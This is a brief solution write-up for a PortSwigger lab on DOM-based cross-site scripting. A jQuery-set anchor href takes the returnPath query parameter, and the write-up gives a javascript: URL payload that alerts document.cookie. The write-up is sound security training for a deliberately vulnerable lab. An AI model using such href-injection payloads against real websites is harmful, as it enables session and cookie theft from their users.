# Lab 19 — DOM XSS in jQuery anchor href attribute sink using location.search source

> **Practitioner** · [Official lab](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-jquery-href-attribute-sink)

**Entry point:** the Submit feedback page writes `returnPath` into an
`<a href>` via jQuery.

## Solution

1. Confirm: `?returnPath=/abc123` lands inside the "back" link's `href`.
2. Change it to a JavaScript URL:

```
?returnPath=javascript:alert(document.cookie)
```

3. Click **back** — lab solved.
